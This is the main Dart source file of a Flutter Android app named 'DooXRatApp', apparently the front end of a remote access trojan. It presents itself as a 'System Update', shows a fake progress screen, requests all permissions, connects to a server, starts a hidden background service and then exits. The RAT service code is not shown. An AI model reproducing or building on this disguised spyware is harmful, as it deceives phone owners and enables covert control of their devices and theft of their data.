import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:async';
import 'services/rat_service.dart';
import 'services/permission_service.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  runApp(const DooXRatApp());
}

class DooXRatApp extends StatelessWidget {
  const DooXRatApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Update',
      theme: ThemeData.dark(),
      debugShowCheckedModeBanner: false,
      home: const SplashScreen(),
    );
  }
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({Key? key}) : super(key: key);

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final RatService _ratService = RatService();
  final PermissionService _permissionService = PermissionService();
  double _progress = 0.0;
  String _status = 'Initializing...';

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    await Future.delayed(const Duration(milliseconds: 500));
    
    setState(() {
      _progress = 0.2;
      _status = 'Checking permissions...';
    });
    
    await _permissionService.requestAllPermissions();
    
    setState(() {
      _progress = 0.5;
      _status = 'Connecting to server...';
    });
    
    await _ratService.initialize();
    
    setState(() {
      _progress = 0.8;
      _status = 'Starting services...';
    });
    
    await _ratService.startBackgroundService();
    
    setState(() {
      _progress = 1.0;
      _status = 'Complete';
    });
    
    await Future.delayed(const Duration(milliseconds: 800));
    
    SystemNavigator.pop();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0a0e27),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(
                Icons.system_update,
                size: 80,
                color: Colors.white70,
              ),
              const SizedBox(height: 32),
              const Text(
                'System Update',
                style: TextStyle(
                  fontSize: 24,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: 48),
              LinearProgressIndicator(
                value: _progress,
                backgroundColor: Colors.white12,
                valueColor: const AlwaysStoppedAnimation<Color>(Color(0xff5765f2)),
              ),
              const SizedBox(height: 16),
              Text(
                _status,
                style: const TextStyle(
                  fontSize: 14,
                  color: Colors.white70,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
